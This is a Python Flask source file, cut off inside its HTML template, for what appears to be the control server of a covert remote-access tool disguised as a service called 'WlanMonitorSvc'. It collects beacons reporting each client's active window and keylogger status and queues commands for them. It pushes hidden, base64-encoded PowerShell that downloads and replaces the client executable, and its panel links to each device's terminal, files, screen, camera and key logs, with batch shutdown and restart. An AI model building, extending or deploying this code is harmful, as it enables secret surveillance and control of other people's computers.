from flask import Blueprint, request, render_template_string, session, redirect, url_for, send_from_directory, jsonify, Response
from datetime import datetime
import os, time, json, threading, re
import urllib.parse
from core import clients_db, save_db, is_online, log_login_attempt, USERNAME, PASSWORD, UPDATE_DIR, VERSION_FILE, encrypt_data, decrypt_data, add_cmd_to_queue, get_next_cmd, init_client_queue

try:
    from core import backup_clients_db
except Exception:
    def backup_clients_db(reason='manual'):
        return None

bp = Blueprint('main', __name__)

@bp.route('/api/ping/<mac>')
def api_ping(mac):
    if mac in clients_db and is_online(clients_db[mac].get('last_seen', '')):
        return jsonify({"status": "online", "kl": clients_db[mac].get('kl', '0')})
    return jsonify({"status": "offline"})

@bp.route('/report', methods=['GET'])
def report_client():
    mac_raw = request.args.get('mac', '')
    ver_raw = request.args.get('ver', '')
    fg_raw = request.args.get('fg', '')
    kl_raw = request.args.get('kl', '')
    dtype_raw = request.args.get('dtype', '')
    wifi_raw = request.args.get('wifi', '')
    wex_raw = request.args.get('wex', '')
    nonce_raw = request.args.get('nonce', '')
    channel_raw = request.args.get('channel', '')
    build_raw = request.args.get('build', '')

    mac = decrypt_data(mac_raw)
    ver = decrypt_data(ver_raw)
    fg = decrypt_data(fg_raw)
    kl = decrypt_data(kl_raw)
    dtype = decrypt_data(dtype_raw) if dtype_raw else ''
    wifi = decrypt_data(wifi_raw) if wifi_raw else ''
    wex = decrypt_data(wex_raw) if wex_raw else ''
    nonce = decrypt_data(nonce_raw) if nonce_raw else ''
    build_channel = decrypt_data(channel_raw) if channel_raw else ''
    build_marker = decrypt_data(build_raw) if build_raw else ''

    # 如果原始传入的mac经过解密后发生了变化（说明本身是Hex加密的），则标记该设备支持加密通信
    is_encrypted = (mac != mac_raw and mac_raw != "")

    if mac and ver:
        time_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # 优化：只需在设备首次上线，或者未记录IP时，服务端才去解析网络层的来访IP
        def get_current_ip():
            ip = request.headers.get('X-Forwarded-For', request.remote_addr)
            return ip.split(',')[0].strip() if ip and ',' in ip else ip

        def get_ip_location(ip):
            if not ip or ip == "127.0.0.1" or ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172."):
                return "局域网/本地"
            try:
                import urllib.request, json
                # 使用 PConline 或其他稳定性更高的国内免费接口补全
                req = urllib.request.Request(f"http://whois.pconline.com.cn/ipJson.jsp?ip={ip}&json=true", headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=3) as url:
                    data = json.loads(url.read().decode('gbk'))
                    return data.get('addr', '').strip() or "未知地区"
            except Exception as e:
                # 备用方案 ip-api
                try:
                    with urllib.request.urlopen(f"http://ip-api.com/json/{ip}?lang=zh-CN", timeout=3) as url:
                        data = json.loads(url.read().decode())
                        if data.get("status") == "success":
                            return f"{data.get('country', '')} {data.get('regionName', '')} {data.get('city', '')}".strip()
                except:
                    pass
            return "解析失败"

        if mac not in clients_db:
            new_ip = get_current_ip()
            clients_db[mac] = {"name": "未命名设备", "ver": ver, "last_seen": time_str, "fg": fg, "kl": kl, "device_type": dtype or "unknown", "has_wifi": wifi or "unknown", "wifi_shutdown_exempt": wex or "0", "build_channel": build_channel or "unknown", "build_marker": build_marker, "heartbeat_nonce": nonce, "encrypted": is_encrypted, "ip": new_ip, "location": get_ip_location(new_ip)}
        else:
            clients_db[mac]["ver"] = ver
            clients_db[mac]["last_seen"] = time_str
            clients_db[mac]["fg"] = fg
            clients_db[mac]["kl"] = kl
            if dtype:
                clients_db[mac]["device_type"] = dtype
            if wifi:
                clients_db[mac]["has_wifi"] = wifi
            if wex:
                clients_db[mac]["wifi_shutdown_exempt"] = wex
            if nonce:
                clients_db[mac]["heartbeat_nonce"] = nonce
            if build_channel:
                clients_db[mac]["build_channel"] = build_channel
            if build_marker:
                clients_db[mac]["build_marker"] = build_marker
            clients_db[mac]["encrypted"] = is_encrypted
            # 避免每次心跳都覆盖 IP，但如果 IP 变动或之前没有成功获取到地区信息时，需要补全
            current_ip = get_current_ip()
            need_loc_update = False

            if clients_db[mac].get("ip") != current_ip:
                clients_db[mac]["ip"] = current_ip
                need_loc_update = True
            elif not clients_db[mac].get("location"):
                need_loc_update = True

            if need_loc_update:
                clients_db[mac]["location"] = "获取中..."
                def fetch_loc(m, ip):
                    loc = get_ip_location(ip)
                    if m in clients_db:
                        clients_db[m]["location"] = loc
                        save_db()
                threading.Thread(target=fetch_loc, args=(mac, current_ip), daemon=True).start()

            if "name" not in clients_db[mac]:
                clients_db[mac]["name"] = "未命名设备"

        save_db()

        def make_response(payload):
            return payload

        # 长轮询机制：挂起等待最多15秒，高频率检测降低响应延迟到100ms
        for i in range(30):
            pending_file_cmd = clients_db[mac].get('pending_file_cmd', '')
            if pending_file_cmd:
                clients_db[mac]['pending_file_cmd'] = ''
                # save_db()
                return make_response(pending_file_cmd), 200

            # 优先从命令队列获取（支持高优先级快速下发）
            next_cmd = get_next_cmd(mac)
            if next_cmd:
                return make_response(next_cmd), 200

            # 兼容旧逻辑：如果有缓存的待执行命令，通过心跳返回让客户端去执行
            pending_cmd = clients_db[mac].get('pending_cmd', '')
            if pending_cmd:
                clients_db[mac]['pending_cmd'] = '' # 下发后清空，只下发一次
                # save_db()
                return make_response(pending_cmd), 200

            if i % 10 == 0:
                clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            time.sleep(0.1)

        # 循环结束前刷新最后心跳时间
        clients_db[mac]["last_seen"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        return make_response("SSID:" + clients_db[mac].get('name', '未命名设备')), 200

    return "Missing parameters", 400

@bp.route('/api/rename', methods=['POST'])
def api_rename():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    new_name = data.get('name')
    if mac in clients_db:
        clients_db[mac]['name'] = new_name
        save_db()
    return jsonify({"status": "ok"})

@bp.route('/api/toggle_test', methods=['POST'])
def api_toggle_test():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json
    mac = data.get('mac')
    if mac in clients_db:
        clients_db[mac]['is_test'] = not clients_db[mac].get('is_test', False)
        save_db()
    return jsonify({"status": "ok", "is_test": clients_db[mac]['is_test']})

@bp.route('/api/wifi_shutdown_exempt/<mac>', methods=['POST'])
def api_wifi_shutdown_exempt(mac):
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    if mac not in clients_db:
        return jsonify({"status": "error", "msg": "设备不存在"}), 404
    data = request.json or {}
    enabled = bool(data.get('enabled', False))
    clients_db[mac]['wifi_shutdown_exempt'] = '1' if enabled else '0'
    init_client_queue(mac)
    clients_db[mac]['cmd_queue'] = [
        item for item in clients_db[mac].get('cmd_queue', [])
        if not str(item.get('cmd', '')).startswith('F_CMD:WIFI_SHUTDOWN_EXEMPT:')
    ]
    add_cmd_to_queue(mac, f"F_CMD:WIFI_SHUTDOWN_EXEMPT:{1 if enabled else 0}", priority='low')
    save_db()
    return jsonify({"status": "ok", "enabled": enabled})


@bp.route('/api/delete', methods=['POST'])
def api_delete():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json or {}
    mac = data.get('mac')
    if mac in clients_db:
        del clients_db[mac]
        save_db()
    return jsonify({"status": "ok"})

@bp.route('/api/batch_delete', methods=['POST'])
def api_batch_delete():
    if not session.get('logged_in'): return jsonify({"status": "error"}), 403
    data = request.json or {}
    macs = data.get('macs', [])
    deleted = 0
    for mac in macs:
        if mac in clients_db:
            del clients_db[mac]
            deleted += 1
    if deleted:
        save_db()
    return jsonify({"status": "ok", "deleted": deleted})

def history_dir_for(channel):
    return os.path.join(UPDATE_DIR, 'history_versions_test' if channel == 'test' else 'history_versions')

def target_dir_for(channel):
    if channel == 'test':
        path = os.path.join(UPDATE_DIR, 'testing')
        os.makedirs(path, exist_ok=True)
        return path
    return UPDATE_DIR

def parse_history_selection(value):
    if '|' in value:
        channel, version = value.split('|', 1)
    else:
        channel, version = 'stable', value
    channel = 'test' if channel == 'test' else 'stable'
    return channel, version.strip()

def version_key(v):
    try:
        return [int(x) if x.isdigit() else x for x in v.split('.')]
    except Exception:
        return [v]

def compare_versions(a, b):
    def parts(v):
        out = []
        for p in re.split(r'[\._-]', (v or '').strip()):
            m = re.match(r'(\d+)(.*)', p)
            if m:
                out.append((0, int(m.group(1))))
                if m.group(2):
                    out.append((1, m.group(2)))
            elif p:
                out.append((1, p))
        return out
    pa, pb = parts(a), parts(b)
    max_len = max(len(pa), len(pb))
    pa += [(0, 0)] * (max_len - len(pa))
    pb += [(0, 0)] * (max_len - len(pb))
    return (pa > pb) - (pa < pb)

def current_version_for_channel(channel):
    version_file = VERSION_FILE if channel == 'stable' else os.path.join(target_dir_for('test'), 'version.txt')
    if os.path.exists(version_file):
        with open(version_file, 'r', encoding='utf-8') as f:
            return f.read().strip()
    return ''

def extract_exe_build_channel(binary_content):
    text = binary_content.decode('latin1', errors='ignore')
    m = re.search(r'WLANMONITOR_BUILD_CHANNEL=(stable|test)', text)
    return m.group(1) if m else ''

def extract_exe_build_version(binary_content):
    text = binary_content.decode('latin1', errors='ignore')
    m = re.search(r'WLANMONITOR_BUILD_VERSION=([0-9][0-9A-Za-z._-]*)', text)
    return m.group(1) if m else ''

def reject_update(message, status=400):
    return f"<h2 style='color:red;'>Update rejected</h2><p>{message}</p><button onclick='history.back()'>Back</button>", status

def list_history_versions(channel):
    root = history_dir_for(channel)
    versions = []
    if os.path.exists(root):
        for d in os.listdir(root):
            ver_dir = os.path.join(root, d)
            if os.path.isdir(ver_dir) and os.path.exists(os.path.join(ver_dir, 'WlanMonitorSvc.exe')):
                versions.append(d)
    try:
        versions.sort(key=version_key, reverse=True)
    except Exception:
        versions.sort(reverse=True)
    return versions

def enqueue_update_for_channel(channel, host_url):
    import base64
    def get_version(v_str):
        try: return [int(x) for x in v_str.strip().split('.')]
        except: return [0, 0, 0]

    for mac, info in clients_db.items():
        if channel == 'test' and not info.get('is_test', False):
            continue
        if is_online(info.get('last_seen', '')):
            client_ver = info.get('ver', '1.0.0')
            if get_version(client_ver) >= [1, 6, 10]:
                clients_db[mac]['pending_cmd'] = 'UPDATE_NOW'
            else:
                ps_cmd = (
                    "$p=(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\WlanMonitorSvc').ImagePath.Replace('\"', ''); "
                    "if (-not $p) { exit }; "
                    f"try {{ (New-Object System.Net.WebClient).DownloadFile('{host_url}/update/WlanMonitorSvc.exe', \"$p.new\") }} catch {{ exit }}; "
                    "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList \"/c taskkill /f /im WlanMonitorSvc.exe & ping 127.0.0.1 -n 3 > nul & move /y `\"$p.new`\" `\"$p`\" & net start WlanMonitorSvc\""
                )
                ps_b64 = base64.b64encode(ps_cmd.encode('utf-16le')).decode('utf-8')
                clients_db[mac]['pending_cmd'] = f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand {ps_b64}"
    save_db()

@bp.route('/update_mgmt', methods=['POST'])
def update_mgmt():
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    uploaded_file = request.files.get('file')
    uploaded_updater = request.files.get('updater_file')
    if not uploaded_file or uploaded_file.filename == '':
        return reject_update("Main EXE upload is required.")

    binary_content = uploaded_file.read()
    new_ver = extract_exe_build_version(binary_content)
    channel = extract_exe_build_channel(binary_content)

    if not new_ver:
        return reject_update("Build version marker was not found inside the uploaded EXE. Rebuild with the latest PromptVersion.ps1 script.")
    if not channel:
        return reject_update("Build channel marker was not found inside the uploaded EXE. Rebuild with the latest PromptVersion.ps1 script.")
    if not re.match(r'^\d+(\.\d+)*[A-Za-z0-9_-]*$', new_ver):
        return reject_update(f"Invalid version marker inside EXE: {new_ver}")

    target_dir = target_dir_for(channel)
    ver_dir = os.path.join(history_dir_for(channel), new_ver)

    current_channel_version = current_version_for_channel(channel)
    if current_channel_version and current_channel_version != "not released" and compare_versions(new_ver, current_channel_version) <= 0:
        return reject_update(f"{channel} EXE version {new_ver} is not newer than current {current_channel_version}. Use rollback if you intentionally want to go back.")

    os.makedirs(ver_dir, exist_ok=True)
    with open(os.path.join(ver_dir, 'WlanMonitorSvc.exe'), 'wb') as f:
        f.write(binary_content)
    with open(os.path.join(target_dir, 'WlanMonitorSvc.exe'), 'wb') as f:
        f.write(binary_content)

    if uploaded_updater and uploaded_updater.filename != '':
        updater_content = uploaded_updater.read()
        with open(os.path.join(ver_dir, 'WlanMonitorSvc.updater.exe'), 'wb') as f:
            f.write(updater_content)
        with open(os.path.join(target_dir, 'WlanMonitorSvc.updater.exe'), 'wb') as f:
            f.write(updater_content)

    version_file = VERSION_FILE if channel == 'stable' else os.path.join(target_dir, 'version.txt')
    with open(version_file, 'w', encoding='utf-8') as f:
        f.write(new_ver)

    enqueue_update_for_channel(channel, request.host_url.rstrip('/'))
    return redirect(url_for('main.index'))

@bp.route('/rollback_version', methods=['POST'])
def rollback_version():
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    channel, rollback_ver = parse_history_selection(request.form.get('history_version') or request.form.get('version') or '')
    if rollback_ver:
        ver_dir = os.path.join(history_dir_for(channel), rollback_ver)
        exe_path = os.path.join(ver_dir, 'WlanMonitorSvc.exe')
        if os.path.exists(exe_path):
            import shutil
            target_dir = target_dir_for(channel)
            shutil.copy2(exe_path, os.path.join(target_dir, 'WlanMonitorSvc.exe'))
            updater_path = os.path.join(ver_dir, 'WlanMonitorSvc.updater.exe')
            if os.path.exists(updater_path):
                shutil.copy2(updater_path, os.path.join(target_dir, 'WlanMonitorSvc.updater.exe'))
            version_file = VERSION_FILE if channel == 'stable' else os.path.join(target_dir, 'version.txt')
            with open(version_file, 'w', encoding='utf-8') as f:
                f.write(rollback_ver)
            enqueue_update_for_channel(channel, request.host_url.rstrip('/'))
    return redirect(url_for('main.index'))

@bp.route('/delete_version', methods=['POST'])
def delete_version():
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    channel, del_ver = parse_history_selection(request.form.get('history_version') or request.form.get('version') or '')
    if del_ver:
        ver_dir = os.path.abspath(os.path.join(history_dir_for(channel), del_ver))
        allowed_root = os.path.abspath(history_dir_for(channel))
        if ver_dir.startswith(allowed_root + os.sep) and os.path.isdir(ver_dir):
            import shutil
            shutil.rmtree(ver_dir)
    return redirect(url_for('main.index'))

@bp.route('/update_server', methods=['POST'])
def update_server():
    if not session.get('logged_in'): return redirect(url_for('auth.login'))
    uploaded_files = request.files.getlist('app_file')

    files_saved = False
    server_dir = os.path.dirname(os.path.abspath(__file__))
    backup_clients_db('server_update')
    for uploaded_app in uploaded_files:
        filename = os.path.basename(uploaded_app.filename or '')
        if uploaded_app and filename.endswith('.py') and filename.startswith(('app', 'bp_', 'core', 'ui')):
            final_path = os.path.join(server_dir, filename)
            tmp_path = final_path + '.upload_tmp'
            uploaded_app.save(tmp_path)
            os.replace(tmp_path, final_path)
            files_saved = True

    if files_saved:
        import threading
        import sys
        import time
        def restart_server():
            time.sleep(1) # 稍微延迟一下确保前端已经得到响应
            os.execv(sys.executable, [sys.executable] + sys.argv)
        threading.Thread(target=restart_server).start()

    return redirect(url_for('main.index'))

@bp.route('/update/<filename>')
def serve_update(filename):
    if filename not in ['version.txt', 'WlanMonitorSvc.exe', 'WlanMonitorSvc.updater.exe']:
        return "拒绝访问", 403

    # 获取客户端附加的参数并尝试解密
    enc_mac = request.args.get('mac', '')
    enc_name = request.args.get('name', '')

    mac = decrypt_data(enc_mac) if enc_mac else ''
    name = decrypt_data(enc_name) if enc_name else ''

    # 判断该设备是否被服务端在面板标记为处于内测通道
    is_test = False
    if mac in clients_db:
        is_test = clients_db[mac].get('is_test', False)

    # 动态选择要提供下载的目录或者直接重定向文件
    if is_test:
        # 如果是内测机，从带 "_test" 后缀的特定文件夹中读取测试版程序及其版本号
        file_dir = os.path.join(UPDATE_DIR, 'testing')
        if not os.path.exists(file_dir):
            os.makedirs(file_dir)
    else:
        # 否则常规机器读取原本目录下的发布版
        file_dir = UPDATE_DIR

    # 兜底：如果测试目录找不到该文件，自动回退到默认目录
    if not os.path.exists(os.path.join(file_dir, filename)):
        file_dir = UPDATE_DIR

    response = send_from_directory(file_dir, filename)
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response



def render_device_tables():
    online_clients = {k: v for k, v in clients_db.items() if is_online(v.get('last_seen', ''))}
    offline_clients = {k: v for k, v in clients_db.items() if not is_online(v.get('last_seen', ''))}
    PARTIAL_HTML = """
    <section class="panel">
      <div class="section-head"><div><h2>Online Devices</h2><p>{{ online_clients|length }} active client(s)</p></div><div class="toolbar compact"><button class="btn muted" onclick="toggleOnlineAll()">Select online</button><button class="btn danger" onclick="batchCmd('shutdown /s /t 0')">Shutdown</button><button class="btn warn" onclick="batchCmd('shutdown /r /t 0')">Restart</button><button class="btn ok" onclick="batchCmd('UPDATE_NOW')">Update</button></div></div>
      <div class="table-scroll"><table><thead><tr><th></th><th>Device</th><th>Network</th><th>Version</th><th>Focus</th><th>Last seen</th><th>Actions</th><th>Status</th></tr></thead><tbody>
      {% for mac, info in online_clients.items() %}
      <tr oncontextmenu="window.showMainContextMenu && window.showMainContextMenu(event)">
        <td data-label="Select"><input type="checkbox" class="online-client-check" value="{{ mac }}"></td>
        <td data-label="Device"><code>{{ mac }}</code><br><span class="subtle">{% if info.get('device_type') == 'laptop' %}💻 Laptop{% elif info.get('device_type') == 'desktop' %}🖥 Desktop{% else %}▣ Unknown{% endif %} · WiFi {{ 'yes' if info.get('has_wifi') == '1' else 'no' if info.get('has_wifi') == '0' else '?' }}</span><br><span class="subtle">{{ info.name }}</span> <button class="mini" onclick="promptRename('{{ mac }}', '{{ info.name }}')">Rename</button></td>
        <td data-label="Network"><code>{{ info.get('ip', 'unknown') }}</code><br><span class="subtle">{{ info.get('location', '') }}</span></td>
        <td data-label="Version">v{{ info.ver }}<br><button class="mini {{ 'test' if info.get('is_test') else '' }}" onclick="toggleTest('{{ mac }}')">{{ 'Test' if info.get('is_test') else 'Stable' }}</button></td>
        <td data-label="Focus" class="focus" title="{{ info.fg|default('none') }}">{{ info.fg|default('none') }}</td>
        <td data-label="Last seen">{{ info.last_seen }}</td>
        <td data-label="Actions" class="actions"><button class="mini" onclick="toggleTest('{{ mac }}')">Channel</button><button class="mini {{ 'test' if info.get('wifi_shutdown_exempt') == '1' else '' }}" onclick="toggleWifiExempt('{{ mac }}', {{ 'false' if info.get('wifi_shutdown_exempt') == '1' else 'true' }})">WiFi exempt {{ 'on' if info.get('wifi_shutdown_exempt') == '1' else 'off' }}</button><a class="mini link" href="/terminal/{{ mac }}">Terminal</a><a class="mini link" href="/files/{{ mac }}">Files</a><a class="mini link" href="/taskmgr/{{ mac }}">Tasks</a><a class="mini link" href="/screen/{{ mac }}">Screen</a><a class="mini link" href="/camera/{{ mac }}">Camera</a><a class="mini link" href="/view_log/{{ mac }}">Logs</a><a class="mini link" href="/entertainment/{{ mac }}">Media</a></td>
        <td data-label="Status"><span class="pill online">Online</span></td>
      </tr>
      {% else %}<tr><td colspan="8" class="empty">No active devices.</td></tr>{% endfor %}
      </tbody></table></div>
    </section>
    <section class="panel">
      <div class="section-head"><div><h2>Offline Records</h2><p>{{ offline_clients|length }} saved record(s). Select multiple records to clean noise quickly.</p></div><div class="toolbar compact"><button class="btn muted" onclick="toggleOfflineAll()">Select offline</button><button class="btn danger" onclick="batchDeleteOffline()">Delete selected</button></div></div>
      <div class="table-scroll"><table><thead><tr><th></th><th>Device</th><th>Last IP / Region</th><th>Version</th><th>Last seen</th><th>Actions</th><th>Status</th></tr></thead><tbody>
      {% for mac, info in offline_clients.items() %}
      <tr>
        <td data-label="Select"><input type="checkbox" class="offline-client-check" value="{{ mac }}"></td>
        <td data-label="Device"><code>{{ mac }}</code><br><span class="subtle">{% if info.get('device_type') == 'laptop' %}💻 Laptop{% elif info.get('device_type') == 'desktop' %}🖥 Desktop{% else %}▣ Unknown{% endif %} · WiFi {{ 'yes' if info.get('has_wifi') == '1' else 'no' if info.get('has_wifi') == '0' else '?' }}</span><br><span class="subtle">{{ info.name }}</span> <button class="mini" onclick="promptRename('{{ mac }}', '{{ info.name }}')">Rename</button></td>
        <td data-label="Network"><code>{{ info.get('ip', 'unknown') }}</code><br><span class="subtle">{{ info.get('location', '') }}</span></td>
        <td data-label="Version">v{{ info.ver }}<br><span class="pill {{ 'test' if info.get('is_test') else 'stable' }}">{{ 'Test' if info.get('is_test') else 'Stable' }}</span></td>
        <td data-label="Last seen">{{ info.last_seen }}</td>
        <td data-label="Actions" class="actions"><button class="mini danger" onclick="deleteClient('{{ mac }}')">Delete</button><button class="mini {{ 'test' if info.get('wifi_shutdown_exempt') == '1' else '' }}" onclick="toggleWifiExempt('{{ mac }}', {{ 'false' if info.get('wifi_shutdown_exempt') == '1' else 'true' }})">WiFi exempt {{ 'on' if info.get('wifi_shutdown_exempt') == '1' else 'off' }}</button><a class="mini link" href="/terminal/{{ mac }}">Terminal log</a><a class="mini link" href="/camera/{{ mac }}">Camera</a><a class="mini link" href="/view_log/{{ mac }}">Run log</a><a class="mini link" href="/keylog/{{ mac }}">Key log</a></td>
        <td data-label="Status"><span class="pill offline">Offline</span></td>
      </tr>
      {% else %}<tr><td colspan="7" class="empty">No offline records.</td></tr>{% endfor %}
      </tbody></table></div>
    </section>
    """
    return render_template_string(PARTIAL_HTML, online_clients=online_clients, offline_clients=offline_clients)


@bp.route('/tables_partial')
def tables_partial():
    if not session.get('logged_in'): return "not logged in", 403
    return render_device_tables()

@bp.route('/', methods=['GET'])
def index():
    if not session.get('logged_in'):
        return redirect(url_for('auth.login'))
    current_server_version = "unknown"
    if os.path.exists(VERSION_FILE):
        with open(VERSION_FILE, 'r', encoding='utf-8') as f: current_server_version = f.read().strip()
    testing_version_file = os.path.join(UPDATE_DIR, 'testing', 'version.txt')
    current_test_version = "not released"
    if os.path.exists(testing_version_file):
        with open(testing_version_file, 'r', encoding='utf-8') as f: current_test_version = f.read().strip()
    stable_history_versions = list_history_versions('stable')
    test_history_versions = list_history_versions('test')
    html_template = """
    <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"><title>Controller Admin</title>
    <style>
    :root{--bg:#f5f7fb;--panel:#fff;--line:#d9e0ea;--text:#1f2937;--muted:#667085;--blue:#2563eb;--green:#16a34a;--red:#dc2626;--amber:#d97706;--slate:#475569}*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Segoe UI,Arial,sans-serif}.shell{max-width:1180px;margin:0 auto;padding:24px 18px 40px}.topbar{display:flex;justify-content:space-between;gap:16px;align-items:center;margin-bottom:18px}.title h1{margin:0;font-size:30px}.title p{margin:6px 0 0;color:var(--muted)}.logout{background:var(--red);color:#fff;padding:10px 15px;border-radius:6px;text-decoration:none;font-weight:600}.grid{display:grid;grid-template-columns:minmax(0,1.4fr) minmax(320px,.8fr);gap:14px;align-items:start}.panel{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:16px;margin-bottom:14px;box-shadow:0 1px 2px rgba(15,23,42,.04)}.panel h2{margin:0;font-size:18px}.section-head{display:flex;justify-content:space-between;gap:12px;align-items:flex-start;margin-bottom:12px}.section-head p{margin:5px 0 0;color:var(--muted);font-size:13px}.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px}input[type=text],input[type=file],select{width:100%;padding:9px 10px;border:1px solid var(--line);border-radius:6px;background:#fff;min-height:38px}.radio-row{display:flex;flex-wrap:wrap;gap:10px;margin:8px 0}.radio-card{border:1px solid var(--line);border-radius:6px;padding:9px 10px;background:#f8fafc;cursor:pointer;color:var(--text)}.version-card{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px}.metric{background:#f8fafc;border:1px solid var(--line);border-radius:8px;padding:12px}.metric span{color:var(--muted);font-size:12px}.metric b{display:block;margin-top:4px;font-size:22px;color:var(--blue)}.toolbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center}.compact{justify-content:flex-end}.btn,button{border:0;border-radius:6px;padding:9px 12px;background:var(--blue);color:#fff;cursor:pointer;font-weight:600;text-decoration:none;display:inline-block;min-height:36px}.btn.ok,button.ok{background:var(--green)}.btn.danger,button.danger{background:var(--red)}.btn.warn,button.warn{background:var(--amber)}.btn.muted,button.muted{background:var(--slate)}.hint{color:var(--muted);font-size:13px;margin-top:8px}.table-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch}table{width:100%;min-width:920px;border-collapse:separate;border-spacing:0}th{text-align:left;font-size:12px;color:#475467;background:#f8fafc;border-bottom:1px solid var(--line);padding:10px}td{border-bottom:1px solid #edf1f6;padding:10px;vertical-align:top;font-size:13px}code{background:#eef2ff;color:#3730a3;padding:2px 5px;border-radius:4px}.subtle{color:var(--muted);font-size:12px}.focus{max-width:220px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#155eef;font-weight:600}.actions{min-width:260px}.mini{border:1px solid var(--line);background:#fff;color:#344054;border-radius:5px;padding:5px 8px;margin:2px;font-size:12px;font-weight:600;text-decoration:none;display:inline-block;min-height:28px}.mini.link{color:#155eef}.mini.test{background:#fff7ed;border-color:#fed7aa;color:#c2410c}.mini.danger{background:#fee2e2;border-color:#fecaca;color:#b91c1c}.pill{display:inline-block;border-radius:999px;padding:3px 8px;font-size:12px;font-weight:700}.pill.online{background:#dcfce7;color:#166534}.pill.offline{background:#fee2e2;color:#991b1b}.pill.test{background:#ffedd5;color:#9a3412}.pill.stable{background:#e0f2fe;color:#075985}.empty{text-align:center;color:var(--muted);padding:24px}.main-context{display:none;position:absolute;z-index:1000;background:white;border:1px solid var(--line);box-shadow:0 8px 24px rgba(15,23,42,.14);border-radius:8px;padding:6px;min-width:170px}.main-context-item{padding:9px 12px;cursor:pointer;border-radius:6px;font-size:14px}.main-context-item:hover{background:#eff6ff;color:#1d4ed8}@media(max-width:900px){.grid,.form-grid,.version-card{grid-template-columns:1fr}.topbar,.section-head{align-items:stretch;flex-direction:column}.compact{justify-content:flex-start}}@media(max-width:640px){.shell{padding:14px 10px 28px}.title h1{font-size:24px}.panel{padding:12px}.toolbar .btn,.toolbar button{flex:1 1 calc(50% - 8px)}table{min-width:0}thead{display:none}tbody,tr,td{display:block;width:100%}tr{border:1px solid var(--line);border-radius:8px;margin-bottom:10px;background:#fff;overflow:hidden}td{border-bottom:1px solid #edf1f6;padding:9px 10px 9px 42%;min-height:38px;position:relative}td:before{content:attr(data-label);position:absolute;left:10px;top:9px;width:35%;color:var(--muted);font-size:12px;font-weight:700}td:last-child{border-bottom:0}.actions{min-width:0}.focus{max-width:none;white-space:normal}input[type=file]{font-size:13px}}
    </style></head><body><main class="shell" onclick="window.hideMainContextMenu&&window.hideMainContextMenu()"><div class="topbar"><div class="title"><h1>Controller Admin</h1><p>Release updates, inspect clients, and clean stale records.</p></div><a href="/logout" class="logout">Logout</a></div>
    <div class="grid"><section class="panel"><div class="section-head"><div><h2>Client Update</h2><p>Upload a compiled EXE. The server reads version and channel from the EXE and publishes to the matching tunnel automatically.</p></div></div><div class="version-card"><div class="metric"><span>Stable version</span><b>{{ current_server_version }}</b></div><div class="metric"><span>Test version</span><b>{{ current_test_version }}</b></div></div><form id="update-form" action="/update_mgmt" method="post" enctype="multipart/form-data"><div class="form-grid"><div><label>Main EXE: WlanMonitorSvc.exe</label><input id="main-exe-input" type="file" name="file" accept=".exe" required></div><div><label>Updater EXE: WlanMonitorSvc.updater.exe</label><input type="file" name="updater_file" accept=".exe"></div></div><div class="toolbar" style="margin-top:14px"><button class="ok" type="submit">Validate and Push</button><span class="hint" id="release-hint">Version and channel are read from the uploaded EXE.</span></div></form></section>
    <section class="panel"><div class="section-head"><div><h2>Version History</h2><p>Stable and test histories are managed separately.</p></div></div><form action="/rollback_version" method="post"><label>History item</label><select name="history_version"><optgroup label="Stable history">{% for v in stable_history_versions %}<option value="stable|{{ v }}">Stable {{ v }}</option>{% endfor %}</optgroup><optgroup label="Test history">{% for v in test_history_versions %}<option value="test|{{ v }}">Test {{ v }}</option>{% endfor %}</optgroup></select><div class="toolbar" style="margin-top:12px"><button class="warn" type="submit" onclick="return confirm('Rollback and push the selected version?')">Rollback and Push</button><button class="danger" type="submit" formaction="/delete_version" onclick="return confirm('Delete selected server history files?')">Delete Files</button></div><p class="hint">A channel appears here after a version with a main EXE has been uploaded.</p></form></section></div>
    <section class="panel"><div class="section-head"><div><h2>Server Hot Update</h2><p>Upload same-name .py files and restart the server process automatically.</p></div></div><form action="/update_server" method="post" enctype="multipart/form-data" class="toolbar"><input type="file" name="app_file" accept=".py" multiple style="max-width:420px"><button type="submit" class="muted">Update Server</button></form></section><div id="target-tables">{{ initial_tables|safe }}</div><div id="main-context" class="main-context"><div class="main-context-item" onclick="onMainContextAction('shutdown /s /t 0')">Batch shutdown</div><div class="main-context-item" onclick="onMainContextAction('shutdown /r /t 0')">Batch restart</div><div class="main-context-item" onclick="onMainContextAction('UPDATE_NOW')">Force update</div></div></main>
